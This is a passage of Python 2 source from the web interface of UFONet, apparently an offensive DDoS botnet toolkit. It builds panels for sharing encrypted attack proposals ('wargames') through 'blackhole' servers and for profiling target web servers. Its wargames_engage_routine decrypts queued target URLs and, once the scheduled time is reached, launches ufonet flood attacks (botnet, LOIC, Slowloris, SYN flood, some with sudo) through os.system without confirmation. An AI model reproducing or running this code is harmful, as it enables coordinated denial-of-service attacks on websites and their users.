            for m in self.list_grid: # msg = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, contact, ID
                if grid_msg_sep in m:
                    version = m.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1)
                    m = m.split(grid_msg_sep)
                    grid_nickname = m[0][0:12]
                    grid_nickname = ''.join(random.sample(grid_nickname,len(grid_nickname))) # nickname (obfuscation+str12)
                    mothership_members = mothership_members + 1
                    grid_ranking = m[1][0:4] # ranking (is parsed later using a symbol)
                    grid_ranking = ''.join(random.sample(grid_ranking,len(grid_ranking))) # ranking (obfuscation)
                    grid_totalchargo = m[2][0:4] # total chargo
                    grid_totalchargo = ''.join(random.sample(grid_totalchargo,len(grid_totalchargo))) # totalchargo (obfuscation)
                    grid_dorking = m[3][0:4] # dorking
                    grid_dorking = ''.join(random.sample(grid_dorking,len(grid_dorking))) # dorking (obfuscation)
                    grid_transferred = m[4][0:4] # transferred
                    grid_transferred = ''.join(random.sample(grid_transferred,len(grid_transferred))) # transferred (obfuscation)
                    grid_maxchargo = m[5][0:4] # maxchargo
                    grid_maxchargo = ''.join(random.sample(grid_maxchargo,len(grid_maxchargo))) # maxchargo (obfuscation)
                    grid_missions = m[6][0:4] # missions
                    grid_missions = ''.join(random.sample(grid_missions,len(grid_missions))) # missions (obfuscation)
                    grid_attacks = m[7][0:4] # attacks
                    grid_attacks = ''.join(random.sample(grid_attacks,len(grid_attacks))) # attacks (obfuscation)
                    grid_loic = m[8][0:4] # loic
                    grid_loic = ''.join(random.sample(grid_loic,len(grid_loic))) # loic (obfuscation)
                    if version == 12: # v1.1
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn =  m[10][0:4] # ufosyn
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[11][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[12] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 11: # v1.0
                        grid_loris = m[9][0:4] # loris
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufosyn present
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[10][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[11] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    elif version == 10: # v0.9
                        grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not loris present
                        grid_loris = ''.join(random.sample(grid_loris,len(grid_loris))) # loris (obfuscation)
                        grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==")[0:4] # not ufosyn present
                        grid_ufosyn = ''.join(random.sample(grid_ufosyn,len(grid_ufosyn))) # ufosyn (obfuscation)
                        grid_contact = "<a href=javascript:alert('"+str(m[9][0:12])+"');>View</a>" # js contact view (obfuscation)
                        try:
                            grid_id = m[10] # id (plain id)
                        except:
                            grid_id = "invalid!"
                    else: # no valid version
                        pass
                    grid_table += "<tr><td align='center'>"+str(grid_nickname)+"</td><td align='center'>"+str(grid_ranking)+"</td><td align='center'>"+str(grid_totalchargo)+"</td><td align='center'>"+str(grid_dorking)+"</td><td align='center'>"+str(grid_transferred)+"</td><td align='center'>"+str(grid_maxchargo)+"</td><td align='center'>"+str(grid_missions)+"</td><td align='center'>"+str(grid_attacks)+"</td><td align='center'>"+str(grid_loic)+"</td><td align='center'>"+str(grid_loris)+"</td><td align='center'>"+str(grid_ufosyn)+"</td><td align='center'>"+str(grid_contact)+"</td></tr>"
                else: # not valid stream data
                    pass
            grid_table += "</table>"
            if mothership_members == 0:
                mothership_members = "¿?"
            l = time.ctime(os.path.getmtime(self.grid_file)) # get last modified time
            mother_grid = "<div id='grid_panel_enc' style='display:block'><br><center><u>MOTHERSHIP STATS:</u> (Last Update: <font color='green'>"+str(l)+"</font>)</center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td>MEMBERS:</td><td align='right'>"+str(mothership_members)+"</td><td><font color='blue' size='4'>****</font></td><td><font color='blue'>¿?</font></td><td><font color='blueviolet' size='4'>***</font></td><td><font color='blueviolet'>¿?</font></td><td><font color='cyan' size='4'>**</font></td><td><font color='cyan'>¿?</font></td><td><font color='white' size='4'>*</font></td><td><font color='white'>¿?</font></td></tr><tr><td>MISSIONS:</td><td>¿?</td><td>ATTACKS:</td><td>¿?</td><td>LOIC:</td><td>¿?</td><td>LORIS:</td><td>¿?</td><td>UFOSYN:</td><td>¿?</td></tr><tr><td>CHARGO (ACTIVE!):</td><td>¿?</td><td>DORKING:</td><td>¿?</td><td>MAX.CHARGO:</td><td>¿?</td></tr></table><br><hr><br>"
            grid_table = mother_grid + grid_table + "</div>"
            return grid_table

    def html_grid(self):
        if '"grid_token": "NONE"' in open(self.mothership_gridcfg_file).read():
            device_state = "OFF"
            device = "Grid device: <font color='red'>OFF</font><br>"
        else:
            device_state = "ON"
            gridcfg_json_file = open(self.mothership_gridcfg_file, "r") # extract mothership gridcfg
            data = json.load(gridcfg_json_file)
            gridcfg_json_file.close()
            grid_token = data["grid_token"]
            grid_contact = data["grid_contact"]
            grid_contact.encode('utf-8')
            grid_nick = data["grid_nick"]
            grid_nick.encode('utf-8')
            if self.ranking == "Rookie": # Rookie
                your_ranking = "<font color='white' size='4'>*</font> (Rookie)"
            elif self.ranking == "Mercenary": # Mercenary
                your_ranking = "<font color='cyan' size='4'>**</font> (Mercenary)"
            elif self.ranking == "Bandit": # Bandit 
                your_ranking = "<font color='blueviolet' size='4'>***</font> (Bandit)"
            elif self.ranking == "UFOmmander!": # UFOmmander!
                your_ranking = "<font color='blue' size='4'>****</font> (UFOmmander!)"
            else:
                your_ranking = "<font color='yellow' size='4'>*</font> (no0b!)" # no0b hacking attempt! ;-)
            device = "<table cellpadding='5'><tr><td> -CONTACT: "+grid_contact.encode('utf-8')+"</td></tr><tr><td> -NICKNAME: "+grid_nick.encode('utf-8')+"</td></tr><tr><td> -RANKING: "+str(your_ranking)+"</td></tr><tr><td> -ID: "+str(grid_token)+"</td></tr></table>"
        if device_state == "OFF":
            grid_panel = ""
        else:
            grid_table = self.generate_grid()
            grid_panel = grid_table + "<br><div id='cmdOut'></div><br></center><center>"
        if device_state == "OFF":
            dec_panel = ""
        else:
            dec_panel = "<table cellpading='5' cellspacing='10'><tr><td><form method='GET'>Your key: <input type='text' name='grid_key' id='grid_key' size='20' value='"+ str(self.crypto_key) +"'></td><td><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_grid();>Try decryption!</a></form></td></tr></table>"
        if device_state == "OFF":
            sync_panel = ""
        else:
            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='grid_source' id='grid_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for records on that blackhole...' onclick='SyncGrid()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><hr>"
        if device_state == "OFF":
            transfer_panel = ""
        else:
            transfer_panel = "<form method='GET'><table cellpadding='5' cellspacing='5'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='grid_source_upload' id='grid_source_upload' size='20' value='"+default_blackhole+"'></td></tr><tr><td>Key (encryption):</td><td><input type='text' name='grid_key_upload' id='grid_key_upload' size='20' value='"+ str(self.crypto_key) +"'></td></tr></table></td><td><button title='Upload stats of your mothership to the Grid of that blackhole...' onclick='TransferGrid()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Transfer data...</button></td></tr></table></form><hr>"
        if device_state == "OFF":
            remove_grid = ""
        else:
            remove_grid = '| <button title="Review your mothership stats..." onclick="Stats()">STATS!</button> | <button title="Syncronize data from a blackhole/grid with your device..." onclick="Sync_panel()">DOWNLOAD!</button> | <button title="Decrypt data with a specific key..." onclick="Decryption_panel()">DECRYPT!</button> | <button title="Send your data to a global blackhole/grid..." onclick="Transfer_panel()">UPLOAD!</button> | <button title="Remove your profile and turn OFF this device..." onclick="RemoveGrid()">TURN OFF!</button>'
        return self.pages["/header"] + """<script language="javascript"> 
function GridProfile() {
        var win_grid_profile = window.open("grid_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function RemoveGrid() {
        var win_grid_profile = window.open("grid_remove","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_grid_profile = window.open("stats","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Sync_panel(){
         document.getElementById("sync_panel_block").style.display = "block";
         document.getElementById("dec_panel").style.display = "none";
         document.getElementById("transfer_panel").style.display = "none";
       }
function SyncGrid(){
        grid_source=document.getElementById("grid_source").value
        if(grid_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="grid_source="+escape(grid_source)
         runCommandX("cmd_sync_grid",params)
         setTimeout("location.reload()", 10000)
         }
      }
function Transfer_panel(){
         document.getElementById("transfer_panel").style.display = "block";
         document.getElementById("sync_panel_block").style.display = "none";
         document.getElementById("dec_panel").style.display = "none";
       }
function TransferGrid() {
        grid_source=document.getElementById("grid_source_upload").value
        grid_key=document.getElementById("grid_key_upload").value
        if(grid_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(grid_key == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            params="grid_source="+escape(grid_source)+"&grid_key="+escape(grid_key)
            runCommandX("cmd_transfer_grid",params)
            setTimeout("location.reload()", 10000)
          }
        }
       }
function Decryption_panel(){
         document.getElementById("dec_panel").style.display = "block";
         document.getElementById("transfer_panel").style.display = "none";
         document.getElementById("sync_panel_block").style.display = "none";
       }
function Decrypt_grid(){
        grid_key=document.getElementById("grid_key").value
        if(grid_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="grid_key="+escape(grid_key)
         runCommandX("cmd_decrypt_grid",params)
         panel_enc = document.getElementById("grid_panel_enc").style.display
         if(panel_enc == "block"){
         panel_enc = document.getElementById("grid_panel_enc").style.display = 'none';
         }
        }
      }
function GridFilter(filter, key){
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_grid_filter", params)
        setTimeout("Decrypt_grid()", 2000)
     }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br><center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('7337-VH13 says: """ + self.ranking + """... Welcome to the Grid. A good place to represent our Federation.');"><img src="/images/aliens/alien6.png"></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>"""+device+"""<br><button title="Set your profile for this device..." onclick="GridProfile()">CONFIGURE!</button> """+remove_grid+"""</td></tr></table></tr></table>
<hr><div id='sync_panel_block' name='sync_panel_block' style='display:none;'>"""+sync_panel+"""</div><div id='transfer_panel' name='transfer_panel' style='display:none;'>"""+transfer_panel+"""</div><div id="dec_panel" style="display:none;">"""+dec_panel+"""<hr></div>"""+grid_panel+"""
""" + self.pages["/footer"]

    def generate_wargames(self):
        with open(self.wargames_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            wargames_table = "<table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>CREATION:</u></td><td align='center'><u>TARGET:</u></td><td align='center'><u>DATE:</u></td><td align='center'><u>ETA:</u></td><td align='center'><u>STATUS:</u></td></tr>"
            for m in self.list_wargames: # list = creation, target, estimated
                if wargames_msg_sep in m:
                    m = m.split(wargames_msg_sep)
                    wargame_creation = m[0][0:12] # creation date
                    wargame_creation = ''.join(random.sample(wargame_creation,len(wargame_creation))) # creation date (obfuscation)
                    wargame_target = m[1][0:12] # target (obfuscation)
                    wargame_target = ''.join(random.sample(wargame_target,len(wargame_target))) # target (obfuscation)
                    wargame_estimated = m[2][0:12] # estimated date
                    wargame_estimated = ''.join(random.sample(wargame_estimated,len(wargame_estimated))) # estimated date (obfuscation)
                    wargame_state = str("HSvtfBFwQBSms8h/7Ra/tKGNYp7KqiiNeOMPzDmrChJqyBJ+yuRiHpY9H+/LDQ==")[0:12] # state ("ENCRYPTED!")
                    wargame_state = ''.join(random.sample(wargame_state,len(wargame_state))) # state (obfuscation)
                    wargame_status = wargame_state # status (obfuscated like state)
                    wargames_table += "<tr><td align='center'>"+str(wargame_creation)+"</td><td align='center'>"+str(wargame_target)+"</td><td align='center'>"+str(wargame_estimated)+"</td><td align='center'>"+str(wargame_state)+"</td><td align='center'>"+str(wargame_status)+"</td></tr>"
            wargames_table += "</table>"
            mother_wargame = "<div id='wargames_panel_enc' style='display:block'>"
            wargames_table = mother_wargame + wargames_table + "</div>"
            return wargames_table

    def html_wargames(self):
        l = time.ctime(os.path.getmtime(self.wargames_file)) # get last modified time
        now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
        wargames_table = self.generate_wargames()
        return self.pages["/header"] + """<script language="javascript">
function Decrypt_wargames(){
        wargames_deckey=document.getElementById("wargames_deckey").value
        if(wargames_deckey == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="wargames_deckey="+escape(wargames_deckey)
         runCommandX("cmd_decrypt_wargames",params)
         panel_enc = document.getElementById("wargames_panel_enc").style.display
         if(panel_enc == "block"){
           panel_enc = document.getElementById("wargames_panel_enc").style.display = 'none';
        }
       }
      }
function SyncWargames(){
        wargames_source=document.getElementById("wargames_source").value
        if(wargames_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="wargames_source="+escape(wargames_source)
         runCommandX("cmd_sync_wargames",params)
         setTimeout("location.reload()", 10000)
         }
      }
function Send() {
        wargames_source2=document.getElementById("wargames_source2").value
        wargames_enckey=document.getElementById("wargames_enckey").value
        wargames_target=document.getElementById("wargames_target").value
        wargames_estimated=document.getElementById("wargames_estimated").value
        if(wargames_source2 == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
        }else{
          if(wargames_enckey == "") {
            window.alert("You need to enter a valid key (provided by someone)");
            return
          }else{
            params="wargames_source2="+escape(wargames_source2)+"&wargames_enckey="+escape(wargames_enckey)+"&wargames_target="+escape(wargames_target)+"&wargames_estimated="+escape(wargames_estimated)
            runCommandX("cmd_transfer_wargame",params)
            setTimeout("location.reload()", 10000)
          }
        }
      }
function JobRemove(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_remove",params)
        setTimeout("Decrypt_wargames()", 2000)
      }
function JobAdd(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_add", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobAddAll() {
        runCommandX("cmd_job_add_all")
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobCancel(id) {
        params="id="+escape(id)
        runCommandX("cmd_job_cancel", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobRemoveAll(key) {
        params="key="+escape(key)
        runCommandX("cmd_job_remove_all", params)
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobCancelAll() {
        runCommandX("cmd_job_cancel_all")
        setTimeout("Decrypt_wargames()", 2000)
     }
function JobFilter(filter, key) {
        params="filter="+escape(filter)+"&key="+escape(key)
        runCommandX("cmd_job_filter", params)
        setTimeout("Decrypt_wargames()", 2000)
}
function EditSupply(){
        if(document.getElementById("supply_edit").value == "EDIT"){
          document.getElementById("supply_botnet").readOnly = false;
          document.getElementById("supply_loic").readOnly = false;
          document.getElementById("supply_loris").readOnly = false;
          document.getElementById("supply_ufosyn").readOnly = false;
          document.getElementById("supply_edit").title = "Set global army supply..."
          document.getElementById("supply_edit").value = "SET"
	  document.getElementById("supply_edit").innerHTML = "SET!"
        }else{
          supply_botnet=document.getElementById("supply_botnet").value
          supply_loic=document.getElementById("supply_loic").value
          supply_loris=document.getElementById("supply_loris").value
          supply_ufosyn=document.getElementById("supply_ufosyn").value
          if(isNaN(parseFloat(supply_botnet)) || parseFloat(supply_botnet) < 0) {
            window.alert("You need to enter a valid BOTNET supply number (int>=0)");
            return
          }else{
          if(isNaN(parseFloat(supply_loic)) || parseFloat(supply_loic) < 0) {
              window.alert("You need to enter a valid LOIC supply number (int>=0)");
              return
            }else{
                if(isNaN(parseFloat(supply_loris)) || parseFloat(supply_loris) < 0) {
                window.alert("You need to enter a valid LORIS supply number (int>=0)");
                return
              }else{
                  if(isNaN(parseFloat(supply_ufosyn)) || parseFloat(supply_ufosyn) < 0) {
                  window.alert("You need to enter a valid UFOSYN supply number (int>=0)");
                  return
                  }else{
	            document.getElementById("supply_botnet").readOnly = true;
          	    document.getElementById("supply_loic").readOnly = true;
	            document.getElementById("supply_loris").readOnly = true;
	            document.getElementById("supply_ufosyn").readOnly = true;
	            document.getElementById("supply_edit").title = "Edit global army supply..."
	            document.getElementById("supply_edit").value = "EDIT"
	            document.getElementById("supply_edit").innerHTML = "EDIT"
                    params="botnet="+escape(supply_botnet)+"&loic="+escape(supply_loic)+"&loris="+escape(supply_loris)+"&ufosyn="+escape(supply_ufosyn)
                    runCommandX("cmd_edit_supply",params)
                    setTimeout("Decrypt_wargames()", 2000)
              }
            }
         }
       }
    }
}
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Vnïjwvödvnh says: """ + self.ranking + """... Are you searching for some real action?. Well, this is your place...');"><img src="/images/aliens/alien8.png"></a></td>
<td>
<pre>This feature will allow you to propose/join some real 'wargames'.

<hr>
<center><table cellpadding="5" border="1"><tr><td>Blackhole/IP:</td><td><input type='text' name='wargames_source' id='wargames_source' size='20' value='"""+default_blackhole+"""'></td><td><button title="Download 'wargames' proposed by other motherships..." onclick="SyncWargames()">DOWNLOAD!</button></td><td><form method='GET'><input type="hidden" name="wargames_deckey" id="wargames_deckey" size="20" value='"""+self.crypto_key+"""' READONLY><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_wargames();>Try decryption!</a></td></tr></table></center></form><br><hr><form method='GET'><table cellpadding='5' cellspacing='5'><tr><td>Your proposal:</td><td><input type="text" name="wargames_target" id="wargames_target" size="30" placeholder="http(s)://" required pattern="https?://.+"></td></tr><tr><td>Date time (UTC):</td><td><input type="text" name="wargames_estimated" id="wargames_estimated" size="20" placeholder="dd-mm-yyyy hh:mm:ss" required pattern=".+-.+-.+ .+:.+:.+"> (ex: """+str(now)+""")</td></tr><tr><td>Blackhole/IP:</td><td><input type='text' name='wargames_source2' id='wargames_source2' size='20' value='"""+default_blackhole+"""'></td></tr><tr><td><input type="hidden" name="wargames_enckey" id="wargames_enckey" size="20" value='"""+self.crypto_key+"""' READONLY></td></tr></table></form><button title="Send your proposal to other motherships..." onClick=Send() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">SEND!</button></pre></td></tr></table>
<hr><br>
<u>WARGAMES</u>: (Last Update: <font color='green'>"""+str(l)+"""</font>)<br><br>"""+wargames_table+"""<div id='cmdOut'></div><br><br>"""+ self.pages["/footer"]

    def html_abduction(self):
        return self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Start(){
        target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
        params="target="+escape(target)

        }else{
          window.alert("You need to enter a valid url: http(s)://target.com");
          return
        }
        runCommandX("cmd_abduction",params)
}
</script></head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Ofgöfeejh says: """ + self.ranking + """... Lets research about our enemies first, right?...');"><img src="/images/aliens/alien7.png"></a></td>
<td>
<pre>
  This feature will provide you information about target's web server. 
  You can use this before to attack to be more effective.

  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button>

<hr>
  * Set your target: <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">

<hr>
   <button title="Start to research about your target's webserver configuration..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">RESEARCH!</button> 
</pre>
</td></tr></table>
<hr><br>
</center>
<div id="cmdOut"></div>""" + self.pages["/footer"]

    def html_blackholes(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        blackhole_key=document.getElementById("blackhole_key").value
        if(blackhole_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="blackhole_key="+escape(blackhole_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshBlackhole(){
        blackholes_source=document.getElementById("blackholes_source").value
        if(blackholes_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="blackholes_source="+escape(blackholes_source)
         runCommandX("cmd_refresh_blackholes",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="blackholes_source" id="blackholes_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Refreshing blackhole..." onClick="RefreshBlackhole()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Open Warp!</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Dhïkta says: """ + self.ranking + """... I can open warps directly to blackholes created by other motherships. This is nice to share and increase your legion on a crypto-distributed way...');"><img src="/images/aliens/alien3.png"></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="blackhole_key" id="blackhole_key" size="20" value='"""+self.crypto_key+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.blackholes_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.blackholes_text+"""</div>
""" + self.pages["/footer"]

    def wargames_engage_routine(self, wargames_engage_list): # check jobs when gui refresh (global army supply)
        sep = "#-#"
        for job in wargames_engage_list:
            job_t2 = job.rsplit(sep, 1)[0]
            job_creation = job_t2.rsplit(sep, 1)[0]
            job_target = job_t2.rsplit(sep, 1)[1]
            job_estimated = job.rsplit(sep, 1)[1]
            self.decrypt(self.crypto_key, job_estimated)
            if self.decryptedtext:
                job_estimated_dec = self.decryptedtext
            else:
                job_estimated_dec = ""
            self.decryptedtext = ""
            now = strftime("%d-%m-%Y %H:%M:%S", gmtime())
            now = strptime(now, "%d-%m-%Y %H:%M:%S")
            job_estimated_dec = strptime(job_estimated_dec, "%d-%m-%Y %H:%M:%S")
            if (job_estimated_dec == now or job_estimated_dec < now): # engage it! (when 'now' or '<')
                self.decrypt(self.crypto_key, job_target)
                if self.decryptedtext:
                    job_target_dec = self.decryptedtext
                else:
                    job_target_dec = ""
                self.decryptedtext = ""
                if job_target_dec is not "":
                    job_target_dec = "http://" + job_target_dec # set target prefix to http://
                    try: # read global army supply (json)
                        with open(self.mothership_supplycfg_file) as data_file:
                            data = json.load(data_file)
                    except:
                        print '[Info] - Cannot found: "core/json/supplycfg.json". Generating...'
                        with open(self.mothership_supplycfg_file, "w") as f:
                            json.dump({"botnet": 1, "loic": 0, "loris": 0, "ufosyn": 0}, f, indent=4)
                    with open(self.mothership_supplycfg_file) as data_file:
                        data = json.load(data_file)
                    self.supply_botnet = data["botnet"]
                    self.supply_loic = data["loic"]
                    self.supply_loris = data["loris"]
                    self.supply_ufosyn = data["ufosyn"]
                    job_estimated_dec = strftime("%d-%m-%Y %H:%M:%S", job_estimated_dec)
                    print "[Info] [Wargames] Time is over: [" + str(job_estimated_dec) + "] -> Engaging target: " + str(job_target_dec)
                    if int(self.supply_ufosyn) > 0: # ufosyn: root required!
                        if int(self.supply_loris) > 0:
                            if int(self.supply_loic) > 0:
                                runcmd = "sudo python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" --loic "+str(self.supply_loic)+" --loris "+str(self.supply_loris)+" --ufosyn "+str(self.supply_ufosyn)+ " "
                            else:
                                runcmd = "sudo python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" --loris "+str(self.supply_loris)+" --ufosyn "+str(self.supply_ufosyn)+ " "
                        else:
                            runcmd = "sudo python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" --ufosyn "+str(self.supply_ufosyn)+ " "
                    else:
                        if int(self.supply_loris) > 0:
                            if int(self.supply_loic) > 0:
                                runcmd = "python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" --loic "+str(self.supply_loic)+" --loris "+str(self.supply_loris)+ " "
                            else:
                                runcmd = "python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" --loris "+str(self.supply_loris)+ " "
                        else:
                            runcmd = "python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+ " "
                    runcmd = runcmd + "--force-yes &" # no raw_input allowed on webgui (+run it as daemon!)
                    print "[Info] [Wargames] Running command:", runcmd, "\n"
                    os.system(runcmd) # launch it!
                    if "!!!" in job: # remove it from queue (unjob)
                        f = open(self.wargames_file, "r")
                        ls = f.readlines()
                        f.close()
                        f = open(self.wargames_file, "w")
                        for l in ls:
                            if str(l) != str(job):
                                f.write(l)
                            else:
                                job = re.sub('[!!!]', '', job)
                                f.write(job)
                        f.close()
                    
    def __init__(self):
        self.crypto_key = crypto_key # set default symmetric crypto key
        self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
        self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
        self.board_file = 'server/board.txt' # set source path to retrieve board warning message
        self.grid_file = 'server/grid.txt' # set source path to retrieve grid
        self.board_warning = "" # set initial (str) board warning message
        self.wargames_file = 'server/wargames.txt' # set source path to retrieve wargames
        self.zombies_file = "botnet/zombies.txt" # set source path to retrieve 'zombies'
        self.aliens_file = "botnet/aliens.txt" # set source path to retrieve 'aliens'
        self.droids_file = "botnet/droids.txt" # set source path to retrieve 'droids'
        self.ucavs_file = "botnet/ucavs.txt" # set source path to retrieve 'ucavs'
        self.rpcs_file = "botnet/rpcs.txt" # set source path to retrieve 'rpcs'
        self.release_date_file = "docs/release.date" # set source path to retrieve release date
        self.news = "server/news.txt" # set source path to retrieve server news
        self.missions = "server/missions.txt" # set source path to retrieve server missions
        self.mothership_webcfg_file = 'core/json/webcfg.json' # set source for mothership webcfg
        self.mothership_stats_file = 'core/json/stats.json' # set source for mothership stats
        self.mothership_boardcfg_file = 'core/json/boardcfg.json' # set source for mothership boardcfg
        self.mothership_gridcfg_file = 'core/json/gridcfg.json' # set source for mothership gridcfg
        self.mothership_supplycfg_file = 'core/json/supplycfg.json' # set source for mothership supplyscfg
        self.ranking = "Rookie Star" # set starting rank
        self.decryptedtext = "" # set buffer for decryption
        self.encryptedtext = "" # set buffer for encryption
        self.blackholes = "server/nodes.dat" # set source path to retrieve server blackholes (nodes.dat)
        self.blackhole = default_blackhole # set default blackhole
        self.blackholes_status = "Not connected!" # set default status for blackholes
        self.blackholes_status_color = "red" # set default status color for blackholes
        self.referer = 'http://127.0.0.1/'
        self.mothershipname = "core/txt/shipname.txt"
        f = open(self.mothershipname) # extract ship name
        self.mothership_id = f.read()
        self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
        f.close()
        f = open(self.release_date_file) # extract release creation datetime
        self.release_date = f.read()
